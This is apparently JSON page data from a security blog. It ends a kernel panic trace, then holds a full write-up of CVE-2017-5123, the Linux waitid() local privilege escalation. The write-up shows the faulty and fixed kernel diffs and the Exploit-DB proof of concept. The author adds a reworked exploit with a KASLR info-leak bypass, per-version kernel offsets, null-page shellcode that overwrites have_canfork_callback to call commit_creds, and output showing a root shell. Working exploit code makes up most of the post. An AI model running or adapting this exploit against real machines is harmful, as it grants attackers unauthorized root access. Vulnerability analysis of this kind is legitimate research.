ww_mutex_lock.part.2+0xf0/0xf0\n[   61.889243]  ? __alloc_pages_slowpath+0x1f6c/0x29c0\n[   61.889481]  ? sched_clock+0x5/0x10\n[   61.889656]  ? warn_alloc+0x110/0x110\n[   61.889833]  ? lock_downgrade+0x690/0x690\n[   61.890028]  ? lock_release+0xff0/0xff0\n[   61.890222]  ? radix_tree_lookup_slot+0x91/0xd0\n[   61.890439]  ? rcutorture_record_progress+0x10/0x10\n[   61.890670]  ? rcu_read_lock_sched_held+0xe4/0x120\n[   61.890901]  ? find_get_entry+0x50c/0xa10\n[   61.891092]  ? __alloc_pages_slowpath+0x29c0/0x29c0\n[   61.891334]  ? __lock_acquire+0x7a7/0x40c0\n[   61.891530]  ? debug_check_no_locks_freed+0x200/0x200\n[   61.891769]  ? pvclock_read_flags+0x150/0x150\n[   61.891977]  ? save_trace+0x2f0/0x2f0\n[   61.892163]  ? kvm_sched_clock_read+0x21/0x30\n[   61.892370]  ? sched_clock+0x5/0x10\n[   61.892538]  ? sched_clock_cpu+0x18/0x170\n[   61.892733]  ? kvm_sched_clock_read+0x21/0x30\n[   61.892940]  ? sched_clock+0x5/0x10\n[   61.893108]  ? find_held_lock+0x39/0x1c0\n[   61.893306]  ? __lock_is_held+0xb4/0x140\n[   61.893497]  ? rcutorture_record_progress+0x10/0x10\n[   61.893736]  ? __alloc_pages_nodemask+0x8e6/0xbc0\n[   61.893961]  ? __alloc_pages_slowpath+0x29c0/0x29c0\n[   61.894195]  ? find_get_pages_contig+0xf60/0xf60\n[   61.894415]  ? deref_stack_reg+0x9b/0x100\n[   61.894608]  ? kvm_sched_clock_read+0x21/0x30\n[   61.894814]  ? sched_clock+0x5/0x10\n[   61.894982]  ? sched_clock_cpu+0x18/0x170\n[   61.895178]  ? save_trace+0x2f0/0x2f0\n[   61.895354]  ? __lock_acquire+0x7a7/0x40c0\n[   61.895560]  ? alloc_pages_current+0xac/0x1e0\n[   61.895768]  ? __page_cache_alloc+0x2ed/0x360\n[   61.895977]  ? find_held_lock+0x39/0x1c0\n[   61.896218]  ? page_endio+0x760/0x760\n[   61.896406]  ? filemap_fault+0xd41/0x1930\n[   61.896605]  ? __lock_page_or_retry+0x4c0/0x4c0\n[   61.896820]  ? rcutorture_record_progress+0x10/0x10\n[   61.897048]  ? pvclock_read_flags+0x150/0x150\n[   61.897263]  ? filemap_map_pages+0xbe3/0x1350\n[   61.897476]  ? __lock_acquire+0x7a7/0x40c0\n[   61.897667]  ? find_get_pages_range_tag+0xf10/0xf10\n[   61.897899]  ? save_trace+0x2f0/0x2f0\n[   61.898074]  ? kvm_sched_clock_read+0x21/0x30\n[   61.898289]  ? sched_clock+0x5/0x10\n[   61.898461]  ? debug_check_no_locks_freed+0x200/0x200\n[   61.898701]  ? save_trace+0x2f0/0x2f0\n[   61.898881]  ? find_held_lock+0x39/0x1c0\n[   61.899071]  ? ext4_filemap_fault+0x78/0xa7\n[   61.899276]  ? lock_acquire+0x15b/0x430\n[   61.899461]  ? lock_contended+0xe70/0xe70\n[   61.899654]  ? lock_release+0xff0/0xff0\n[   61.899849]  ? down_read+0xb5/0x180\n[   61.900018]  ? down_write_killable_nested+0x190/0x190\n[   61.900269]  ? ext4_filemap_fault+0x80/0xa7\n[   61.900468]  ? __do_fault+0xd8/0x360\n[   61.900641]  ? print_bad_pte+0x5b0/0x5b0\n[   61.900831]  ? pvclock_read_flags+0x150/0x150\n[   61.901039]  ? __handle_mm_fault+0x11d9/0x3080\n[   61.901255]  ? sched_clock+0x5/0x10\n[   61.901422]  ? sched_clock_cpu+0x18/0x170\n[   61.901612]  ? find_held_lock+0x39/0x1c0\n[   61.901801]  ? vm_insert_mixed_mkwrite+0x30/0x30\n[   61.902020]  ? lock_acquire+0x15b/0x430\n[   61.902209]  ? lock_downgrade+0x690/0x690\n[   61.902401]  ? kvm_sched_clock_read+0x21/0x30\n[   61.902607]  ? lock_release+0xff0/0xff0\n[   61.902791]  ? do_raw_spin_trylock+0x180/0x180\n[   61.903006]  ? _raw_spin_unlock_irqrestore+0x46/0x60\n[   61.903245]  ? trace_hardirqs_on_caller+0x381/0x570\n[   61.903476]  ? remove_wait_queue+0x188/0x250\n[   61.903678]  ? save_trace+0x2f0/0x2f0\n[   61.903854]  ? lock_acquire+0x15b/0x430\n[   61.904036]  ? __do_page_fault+0x2f6/0xb50\n[   61.904225]  ? do_wait+0x425/0xa20\n[   61.904389]  ? lock_release+0xff0/0xff0\n[   61.904572]  ? wait_consider_task+0x3500/0x3500\n[   61.904796]  ? rcu_note_context_switch+0x6e0/0x6e0\n[   61.905021]  ? cpu_extra_stat_show+0x10/0x10\n[   61.905231]  ? handle_mm_fault+0x12e/0x390\n[   61.905429]  ? __do_page_fault+0x4fa/0xb50\n[   61.905627]  ? vmalloc_fault+0x930/0x930\n[   61.905813]  ? SyS_waitid+0x40/0x40\n[   61.905986]  ? do_page_fault+0xb5/0x5b0\n[   61.906176]  ? __do_page_fault+0xb50/0xb50\n[   61.906372]  ? SYSC_wait4+0x95/0x110\n[   61.906543]  ? kernel_wait4+0x330/0x330\n[   61.906728]  ? syscall_return_slowpath+0x2cd/0x450\n[   61.906957]  ? entry_SYSCALL_64_fastpath+0x4b/0x96\n[   61.907192]  ? async_page_fault+0x36/0x60\n[   61.907393]  ? trace_hardirqs_off_thunk+0x1a/0x1c\n[   61.907618]  ? async_page_fault+0x36/0x60\n[   61.907810]  ? async_page_fault+0x4c/0x60\n[   61.908170] Kernel Offset: 0x2b200000 from 0xffffffff81000000 (relocation range: 0xffffffff80000000-0xffffffffbfffffff)\n[   61.908670] ---[ end Kernel panic - not syncing: Out of memory and no killable processes...\n[   61.908670]\n```\n\nAs a result, kernel panic is triggered because of OOM (Out Of Memory).\n\n**End**\n","excerpt":"spin-lock recursion bug (leading to deadlock) There's no recursion check on spinlock where I found it (not exact). So when executed recursi…","fields":{"slug":"/2017-12-LK-Founds/"},"frontmatter":{"date":"Dec 10, 2017","title":"Linux Kernel - 2017-12 Founds","tags":["Security","Linux-Kernel"],"update":"Dec 20, 2017"},"timeToRead":11}},{"node":{"rawMarkdownBody":"\nLinux Kernel waitid() Local Privilege Escalation\n\n## TL;DR\n\nSome days ago, i just saw this vulnerability somewhere in google. It's about **Kernel Exploitation, CVE-2017-5123**.\nMaybe It works on 4.14.0-rc1 ~ 4.14.0-rc4 and the latest released version is 4.14.0-rc7 and stable build is 4.13.10 (2017/11/2).\n\nThe reasons for analyzing this vulnerability are 'the payload' and 'the vulnerability'. Because it just triggers *null dereference* which is rarely seen.\nSo, I just think that... how could it be? at the first time without seeing any information.\nNot only that, but it was also strange that this vulnerability exists in the latest!\n\n## 1 - day vulnerability : CVE-2017-5123\n\nLet's see the title first :)\n> **Linux Kernel 4.14.0-rc4+ - 'waitid()' Privilege Escalation**\n\nIt's an LPE(Local Privilege Escalation) using waitid().\n\nNow, let's see the difference of the codes and commits by version and how it works.\n\n\n## Before\n\n[Before Commit](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=4c48abe91be03d191d0c20cc755877da2cb35622).\n\n```c\n@@ -1625,15 +1625,18 @@ SYSCALL_DEFINE5(waitid, int, which, pid_t, upid, struct siginfo __user *,\n \tif (!infop)\n \t\treturn err;\n \n-\tif (put_user(err ? 0 : SIGCHLD, &infop->si_signo) ||\n-\t    put_user(0, &infop->si_errno) ||\n-\t    put_user((short)info.cause, &infop->si_code) ||\n-\t    put_user(info.pid, &infop->si_pid) ||\n-\t    put_user(info.uid, &infop->si_uid) ||\n-\t    put_user(info.status, &infop->si_status))\n-\t\terr = -EFAULT;\n-\n+\tuser_access_begin();\n+\tunsafe_put_user(err ? 0 : SIGCHLD, &infop->si_signo, Efault);\n+\tunsafe_put_user(0, &infop->si_errno, Efault);\n+\tunsafe_put_user((short)info.cause, &infop->si_code, Efault);\n+\tunsafe_put_user(info.pid, &infop->si_pid, Efault);\n+\tunsafe_put_user(info.uid, &infop->si_uid, Efault);\n+\tunsafe_put_user(info.status, &infop->si_status, Efault);\n+\tuser_access_end();\n \treturn err;\n+Efault:\n+\tuser_access_end();\n+\treturn -EFAULT;\n }\n \n static long kernel_wait4(pid_t upid, int __user *stat_addr,\n@@ -1736,13 +1739,20 @@ COMPAT_SYSCALL_DEFINE5(waitid,\n \t\t\treturn -EFAULT;\n \t}\n \n-\tif (put_user(err ? 0 : SIGCHLD, &infop->si_signo) ||\n-\t    put_user(0, &infop->si_errno) ||\n-\t    put_user((short)info.cause, &infop->si_code) ||\n-\t    put_user(info.pid, &infop->si_pid) ||\n-\t    put_user(info.uid, &infop->si_uid) ||\n-\t    put_user(info.status, &infop->si_status))\n-\t\terr = -EFAULT;\n+\tif (!infop)\n+\t\treturn err;\n+\n+\tuser_access_begin();\n+\tunsafe_put_user(err ? 0 : SIGCHLD, &infop->si_signo, Efault);\n+\tunsafe_put_user(0, &infop->si_errno, Efault);\n+\tunsafe_put_user((short)info.cause, &infop->si_code, Efault);\n+\tunsafe_put_user(info.pid, &infop->si_pid, Efault);\n+\tunsafe_put_user(info.uid, &infop->si_uid, Efault);\n+\tunsafe_put_user(info.status, &infop->si_status, Efault);\n+\tuser_access_end();\n \treturn err;\n+Efault:\n+\tuser_access_end();\n+\treturn -EFAULT;\n }\n #endif\n```\n\nThis commit is from *Linux Kernel v4.13.x*, In the existing waitid(),\n> siginfo __user *\n\nthere were codes checking it whether user-land or kernel-land address. But it **removed**.\nSo, by __user *, kernel-land access could be possible on user-land.\n\nLet's say from an exploit point of view, waitid() form what we use is\n> int waitid(idtype_t idtype, id_t id, siginfo_t *infop, int options);\n\nlike that. By using *infop*, we can **write** arbitrary value on **arbitrary kernel-land memory** and control it!\nI'm out of words :|\n\n## After\n\n[After Commit](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=96ca579a1ecc943b75beba58bebb0356f6cc4b51).\n\n```c\ndiff --git a/kernel/exit.c b/kernel/exit.c\nindex f2cd53e..cf28528 100644\n--- a/kernel/exit.c\n+++ b/kernel/exit.c\n@@ -1610,6 +1610,9 @@ SYSCALL_DEFINE5(waitid, int, which, pid_t, upid, struct siginfo __user *,\n \tif (!infop)\n \t\treturn err;\n \n+\tif (!access_ok(VERIFY_WRITE, infop, sizeof(*infop)))\n+\t\tgoto Efault;\n+\n \tuser_access_begin();\n \tunsafe_put_user(signo, &infop->si_signo, Efault);\n \tunsafe_put_user(0, &infop->si_errno, Efault);\n@@ -1735,6 +1738,9 @@ COMPAT_SYSCALL_DEFINE5(waitid,\n \tif (!infop)\n \t\treturn err;\n \n+\tif (!access_ok(VERIFY_WRITE, infop, sizeof(*infop)))\n+\t\tgoto Efault;\n+\n \tuser_access_begin();\n \tunsafe_put_user(signo, &infop->si_signo, Efault);\n \tunsafe_put_user(0, &infop->si_errno, Efault);\n```\nNowadays, it just fixed like above.\n\n## Payload Analysis\n\nOf course, by above vulnerability, we can trigger that with **several various ways** but let's see 'the orignal' first :)\n[payload](https://www.exploit-db.com/exploits/43029/).\n\n```c\n#define _GNU_SOURCE\n \n#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <sys/types.h>\n#include <sys/wait.h>\n#include <sys/mman.h>\n#include <string.h>\n \nstruct cred;\nstruct task_struct;\n  \ntypedef struct cred *(*prepare_kernel_cred_t) (struct task_struct *daemon) __attribute__((regparm(3)));\ntypedef int (*commit_creds_t) (struct cred *new) __attribute__((regparm(3)));\n  \nprepare_kernel_cred_t   prepare_kernel_cred;\ncommit_creds_t    commit_creds;\n  \nvoid get_shell() {\n  char *argv[] = {\"/bin/sh\", NULL};\n  \n  if (getuid() == 0){\n    printf(\"[+] Root shell success !! :)\\n\");\n    execve(\"/bin/sh\", argv, NULL);\n  }\n  printf(\"[-] failed to get root shell :(\\n\");\n}\n  \nvoid get_root() {\n  if (commit_creds && prepare_kernel_cred)\n    commit_creds(prepare_kernel_cred(0));\n}\n  \nunsigned long get_kernel_sym(char *name)\n{\n  FILE *f;\n  unsigned long addr;\n  char dummy;\n  char sname[256];\n  int ret = 0;\n  \n  f = fopen(\"/proc/kallsyms\", \"r\");\n  if (f == NULL) {\n    printf(\"[-] Failed to open /proc/kallsyms\\n\");\n    exit(-1);\n  }\n  printf(\"[+] Find %s...\\n\", name);\n  while(ret != EOF) {\n    ret = fscanf(f, \"%p %c %s\\n\", (void **)&addr, &dummy, sname);\n    if (ret == 0) {\n      fscanf(f, \"%s\\n\", sname);\n      continue;\n    }\n    if (!strcmp(name, sname)) {\n      fclose(f);\n      printf(\"[+] Found %s at %lx\\n\", name, addr);\n      return addr;\n    }\n  }\n  fclose(f);\n  return 0;\n}\n \nint main(int ac, char **av)\n{\n    if (ac != 2) {\n        printf(\"./exploit kernel_offset\\n\");\n        printf(\"exemple = 0xffffffff81f3f45a\");\n        return EXIT_FAILURE;\n    }\n \n    // 2 - Appel de la fonction get_kernel_sym pour rcuperer dans le /proc/kallsyms les adresses des fonctions\n    prepare_kernel_cred = (prepare_kernel_cred_t)get_kernel_sym(\"prepare_kernel_cred\");\n    commit_creds = (commit_creds_t)get_kernel_sym(\"commit_creds\");\n    // have_canfork_callback offset <= rendre dynamique aussi\n     \n    pid_t     pid;\n    /* siginfo_t info; */\n \n    // 1 - Mapper la mmoire  l'adresse 0x0000000000000000\n    printf(\"[+] Try to allocat 0x00000000...\\n\");\n    if (mmap(0, 4096, PROT_READ|PROT_WRITE|PROT_EXEC,MAP_ANON|MAP_PRIVATE|MAP_FIXED, -1, 0) == (char *)-1){\n        printf(\"[-] Failed to allocat 0x00000000\\n\");\n        return -1;\n    }\n    printf(\"[+] Allocation success !\\n\");\n    /* memset(0, 0xcc, 4096); */\n    /*\n        movq rax, 0xffffffff81f3f45a\n        movq [rax], 0\n        mov rax, 0x4242424242424242\n        call rax\n        xor rax, rax\n        ret\n        replace 0x4242424242424242 by get_root\n    https://defuse.ca/online-x86-assembler.htm#disassembly\n    */\n    unsigned char shellcode[] = \n    { 0x48, 0xC7, 0xC0, 0x5A, 0xF4, 0xF3, 0x81, 0x48, 0xC7, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0xB8, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0xFF, 0xD0, 0x48, 0x31, 0xC0, 0xC3 };\n    void **get_root_offset = rawmemchr(shellcode, 0x42);\n    (*get_root_offset) = get_root;\n \n    memcpy(0, shellcode, sizeof(shellcode));\n    /* strcpy(0, \"\\x48\\x31\\xC0\\xC3\"); // xor rax, rax; ret */\n \n    if(-1 == (pid = fork())) {\n        perror(\"fork()\");\n        return EXIT_FAILURE;\n    }\n \n    if(pid == 0) {\n        _exit(0xDEADBEEF);\n        perror(\"son\");\n        return EXIT_FAILURE;\n    }\n \n    siginfo_t *ptr = (siginfo_t*)strtoul(av[1], (char**)0, 0);\n    waitid(P_PID, pid, ptr, WEXITED | WSTOPPED | WCONTINUED);\n \n    // TRIGGER\n    pid = fork();\n    printf(\"fork_ret = %d\\n\", pid); \n    if (pid > 0)\n        get_shell();\n    return EXIT_SUCCESS;\n}\n```\nWhat 'the maker' said about that code, in short.\n> For exploitation, trigger null dereference.\n> Overwrite have_canfork_callback (.bss seg in kernel),\n> if have_canfork_callback is set to a value other than 0, unset callback (null) is occurred.\n> ...\n\n## But...\n\nBut... Let's talk about *my small option* **only about** that *payload*, **Only talk about that payload**, i can say that it's triggered, but... something is missing(?).\nOf course maybe, that payload was made for **trigger purposes only**.\n\nBecause of the testing environments. *KASLR* is off and *mmap min address* is 0 for triggering null dereference.\n> -nokaslr\n> sysctl -w vm.mmap_min_addr=0\n\n### 1. KASLR Bypass\n\nLet's talk about it first, **kernel-land ASLR**, **KASLR** is supported from *linux kernel 4.4*. When we boot with *kaslr option*, then *kaslr* will be applied. If not, *kaslr* is off.\nNormally we just boot the OS, then *kaslr* is off.\n\nAnd another question is below.\n```c\n    prepare_kernel_cred = (prepare_kernel_cred_t)get_kernel_sym(\"prepare_kernel_cred\");\n    commit_creds = (commit_creds_t)get_kernel_sym(\"commit_creds\");\n```\nThis part from the code is just getting the addresses from */proc/kallsyms*.\nBut actually, it does not work as well because if we read the address from */proc/kallsysms* without *root perm* and *kaslr*, the address would be 0.\nIn summary,\n* with *nokaslr*, **user gets** 0, **root** gets **exact address**.\n* with *kaslr*, can read but all time **random address**. (try it yourself!)\n\nWe can see that below.\n```c\nzero@ubuntu:~$ uname -a\nLinux ubuntu 4.13.8-041308-generic #201710180430 SMP Wed Oct 18 08:33:18 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux\nzero@ubuntu:~$ id\nuid=1000(zero) gid=1000(zero) groups=1000(zero),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),121(lpadmin),131(sambashare)\nzero@ubuntu:~$ cat /proc/kallsyms | grep prepare_kernel_cred\n0000000000000000 T prepare_kernel_cred\n0000000000000000 r __ksymtab_prepare_kernel_cred\n0000000000000000 r __kstrtab_prepare_kernel_cred\nzero@ubuntu:~$ sudo su\n[sudo] password for zero: \nroot@ubuntu:/home/zero# id\nuid=0(root) gid=0(root) groups=0(root)\nroot@ubuntu:/home/zero# cat /proc/kallsyms | grep prepare_kernel_cred\nffffffff8c4a8390 T prepare_kernel_cred\nffffffff8d1ac010 r __ksymtab_prepare_kernel_cred\nffffffff8d1c6526 r __kstrtab_prepare_kernel_cred\nroot@ubuntu:/home/zero# cat /proc/kallsyms | grep prepare_kernel_cred\nffffffff8c4a8390 T prepare_kernel_cred\nffffffff8d1ac010 r __ksymtab_prepare_kernel_cred\nffffffff8d1c6526 r __kstrtab_prepare_kernel_cred\nroot@ubuntu:/home/zero#\n```\n\n**So, user-land with nokaslr, we can't get exact address from /proc/kallsysms with user-perm**\n\n### 2. mmap_min_addr is set to 0\n\nThis value is set to **65536** by default for protecting from *null dereference*.\n(Actually mmap_min_addr is different by platform or OS whatever... ㅇㅅㅇ)\n\n> root@ubuntu:/etc/sysctl.d# cat *zeropage.conf <br/>\n> ... <br/>\n> vm.mmap_min_addr = 65536 <br/>\n> root@ubuntu:/etc/sysctl.d#  <br/>\n\n## Then...?\n\n**It's not related to this vulnerability**, In the wild, for bypassing mitigation and exploiting fully, it's normal that getting at least one more *info leak* is essential on any platforms.\n\nThat vulnerability let us give *w perm* on *infop* partially, but if there are kaslr and others, then we need to leak *kernel base address* or sth and other sub-works are needed as well.\n\n## Conclusion\n\nIt is interesting that this kind of vulnerability in the latest version of Linux Kernel can lead to mistakes yet ;).\nAnyway, it's surprising :).\n\nIn addition 1, **mmap_min_addr** is set to 0, with **nokaslr**, known *prepare_kernel_cred*, *commit_creds* addresses already, so there could be several ways to exploit this vulnerability.\n\nTry it Yourself :)\n\nIn addition 2, on *somewhere v4.13.x* when *kaslr* is on, we can bypass *kaslr* with **info leak** by using waitid().\n\nLastly, I just re-make(?) exploit-code with includding kaslr bypass :).\nBut maybe it worked on only *4.13.0 < x <= 4.13.4* and just patched somewhere *4.13.X or 4.14.0-rcX*.\n\n```c\n#define _GNU_SOURCE\n\n#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <string.h>\n\n#include <sys/types.h>\n#include <sys/wait.h>\n#include <sys/mman.h>\n#include <sys/utsname.h>\n#include <sys/resource.h>\n\n#include <syscall.h>\n\n#define KASLR_BYPASS 1\n#define SMEP_SMAP_BYPASS 0\n\nstruct cred;\nstruct task_struct;\n\ntypedef struct cred *(*prepare_kernel_cred_t)(struct task_struct *daemon)__attribute__((regparm(3)));\ntypedef int(*commit_creds_t)(struct cred *new)__attribute__((regparm(3)));\n\nunsigned long kernel_base = 0;\nprepare_kernel_cred_t prepare_kernel_cred;\ncommit_creds_t commit_creds;\n\n// sudo sysctl -w vm.mmap_min_addr=0\n// sudo cat /proc/kallsyms | grep _text | head -n 1\n\nunsigned long k_offset[][4] = {\n  { /* Linux Kernel 4.14.0-rc4+ info */ /* trigger! */\n    0x753d0,\n    0x75050,\n    0xf3f45a,\n  },\n  { /* Linux Kernel 4.14.0-rc4 info */ /* triggered! but process is killed */\n    0xaa6a0,\n    0xaa310,\n    0x106046c,\n  },\n  { /* Linux Kernel 4.13.0-16 info */ /* not triggered */\n    0xa8530,    // prepare_kernel_cred\n    0xa81a0,    // commit_creds\n    0x105ff2c,  // have_canfork_callback\n    0x1e540,    // native_read_cr4\n  },\n  { /* Linux Kernel 4.13.4 info */ /* trigger! but process is killed */\n    0xa8340,\n    0xa7fb0,\n    0x105fe2c,\n  },\n  { /* Linux Kernel 4.13.8 info */ /* trigger! but process is killed */\n    0xa8390,\n    0xa8000,\n    0x106042c,\n  },\n  { /* Linux Kernel 4.13.10 info */ /* not triggered */\n    0xa8390,\n    0xa8000,\n    0x10603ac,\n  },\n};\n\nunsigned long user_cs = 0x0;\nunsigned long user_ss = 0x0;\nunsigned long user_rflags = 0x0;\n\nvoid backup_stat() {  \n    asm(\n        \"movq %%cs, %0\\n\"\n        \"movq %%ss, %1\\n\"\n        \"pushfq\\n\"\n        \"popq %2\\n\"\n        : \"=r\" (user_cs), \"=r\" (user_ss), \"=r\" (user_rflags) : : \"memory\"\n    );\n}\n\nvoid get_shell() { if (getuid() == 0) system(\"/bin/sh\"); }\nvoid get_root() { if (commit_creds && prepare_kernel_cred) commit_creds(prepare_kernel_cred(0)); }\n\nunsigned long kaslr_bypass() {\n  pid_t pid = fork();\n  if (pid > 0) {\n    struct rusage ru = {};\n    syscall(__NR_waitid, P_PID, pid, NULL, WEXITED | WNOHANG | __WNOTHREAD, &ru);\n\n    unsigned long *p = (unsigned long *)&ru;\n    for (; p < (unsigned long *)((char *)&ru + sizeof(ru)); ++p)\n      if (*p > 0xffffffff00000000 && *p < 0xffffffffff000000)\n        return (*p & ~0xfffff) - 0x100000;\n  }\n  return 0;\n}\n\nint main(int argc, char *argv[]) {\n  if (!(argc == 3 || argc == 2)) {\n    printf(\"Usage : %s [<kernel_base_addr>] <kernel_version>\\n\", argv[0]);\n    return EXIT_SUCCESS;\n  }\n\n  if (argc == 3) kernel_base = (unsigned long)strtoul(argv[1], (char **)0, 0);\n  else if (argc == 2) kernel_base = kaslr_bypass();\n\n  if (kernel_base == 0) {\n    printf(\"\\e[31m[-] Failed to leak kernel_base:(\\n\");\n    return EXIT_FAILURE;\n  }\n  \n  backup_stat(); /* backup userland env */\n  \n  struct utsname buf;\n  if (!uname(&buf)) printf(\"\\e[36m[*] Kernel Version \\e[34m: %s\\n\", buf.release);\n  printf(\"\\e[35m[+] Kernel Base           \\e[34m: %#llx\\n\", (unsigned long long)kernel_base);\n\n  int k_ver = (int)strtoul(argv[argc - 1], (char **)0, 0);\n\n  prepare_kernel_cred = (prepare_kernel_cred_t)(kernel_base + k_offset[k_ver][0]);\n  commit_creds = (commit_creds_t)(kernel_base + k_offset[k_ver][1]);\n  siginfo_t *have_canfork_callback = (siginfo_t *)(kernel_base + k_offset[k_ver][2]);\n\n  printf(\"\\e[35m[+] prepare_kernel_cred   \\e[34m: %#llx\\n\", (unsigned long long)prepare_kernel_cred);\n  printf(\"\\e[35m[+] commit_creds          \\e[34m: %#llx\\n\", (unsigned long long)commit_creds);\n  printf(\"\\e[35m[+] have_canfork_callback \\e[34m: %#llx\\n\", (unsigned long long)have_canfork_callback);\n\n  printf(\"\\e[36m[*] Stage 1 - Try to allocate 0x0\\n\");\n  if (mmap((void *)0, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANON | MAP_PRIVATE | MAP_FIXED, -1, 0) == (char *)-1) {\n    printf(\"\\e[31m[-] Failed to allocate 0x0\\n\");\n    return EXIT_FAILURE;\n  }\n\n  printf(\"\\e[36m[*] Stage 2 - Inject shellcode\\n\");\n  \n  unsigned char shellcode[] = {\n      /* insert 0 into have_canfork_callback */\n      0x48, 0xB8,\n      0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, // mov rax, have_canfork_callback\n      0x48, 0xC7,\n      0x00, 0x00, 0x00, 0x00, 0x00,                   // mov [rax], 0x0\n      /* SMEP/SMAP Bypass */\n      // 0x68,\n      // 0xf0, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // push 0x00000000000006f0\n      // 0x5f, 0xc3,                                     // pop rdi; ret;\n      // 0x0f, 0x22, 0xe7, 0xc3,                         // mov cr4, rdi; ret;\n      /* call get_root() */\n      0x48, 0xB8,\n      0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, // mov rax, &get_root()\n      0xFF, 0xD0, 0x48,                               // call rax\n      /* userland info */\n      // 0x0f, 0x01, 0xf8, 0xc3                       // swapgs; ret;\n      // 0x48, 0xcf                                   // iretq;\n      // rip = get_shell\n      // cs = user_cs\n      // rflags = user_rflags\n      // rsp = asm('rsp')\n      // ss = user_ss\n      /* jmp to nullptr */\n      0x31, 0xC0, 0xC3,                               // xor rax, rax; ret;\n  };\n\n  void **offset = 0;\n  \n  offset = rawmemchr(shellcode, 0x41);\n  (*offset) = have_canfork_callback;\n\n  offset = rawmemchr(shellcode, 0x42);\n  (*offset) = get_root;\n\n  memcpy((void *)0, shellcode, sizeof(shellcode));\n\n  pid_t pid;\n  if ((pid = fork()) == -1) return EXIT_FAILURE;\n  if (pid == 0) return EXIT_FAILURE;\n\n  printf(\"\\e[36m[*] Stage 3 - Trigger waitid()\\n\");\n  if (waitid(P_PID, pid, have_canfork_callback, WEXITED | WSTOPPED | WCONTINUED) == -1) {\n    perror(\"waitpid()\");\n    return EXIT_FAILURE;\n  }\n\n  pid = fork(); // Trigger\n\n  if (pid > 0) get_shell();\n  return EXIT_SUCCESS;\n}\n```\n```c\n/ $ id\nuid=1001(zero) gid=1001(zero) groups=1001(zero)\n/ $ ./exp 0xffffffff81000000 0\n[*] Kernel Version : 4.14.0-rc4+\n[+] Kernel Base           : 0xffffffff81000000\n[+] prepare_kernel_cred   : 0xffffffff810753d0\n[+] commit_creds          : 0xffffffff81075050\n[+] have_canfork_callback : 0xffffffff81f3f45a\n[*] Stage 1 - Try to allocate 0x0\n[*] Stage 2 - Inject shellcode\n[*] Stage 3 - Trigger waitid()\n/ # id\nuid=0(root) gid=0(root)\n```\n\n[+] Plus\n\n```c\nzero@ubuntu:~/Desktop/kaslr_bypass$ ./exp 0\n[*] Kernel Version : 4.13.4-041304-generic\n[+] Kernel Base           : 0xffffffffa0a00000\n...\nzero@ubuntu:~/Desktop/kaslr_bypass$ sudo cat /proc/kallsyms | grep _text | head -n 1\nffffffffa0a00000 T _text\n```\n\n**End**\n","excerpt":"Linux Kernel waitid() Local Privilege Escalation TL;DR Some days ago, i just saw this vulnerability somewhere in google. It's about Kernel …","fields":{"slug":"/CVE-2017-5123/"},"frontmatter":{"date":"Oct 29, 2017","title":"LK v4.13.x - waitid() LPE","tags":["Security","Linux-Kernel"],"update":"Oct 29, 2017"},"timeToRead":13}}]}},"pageContext":{}},"staticQueryHashes":["2027115977","2744905544","694178885"]}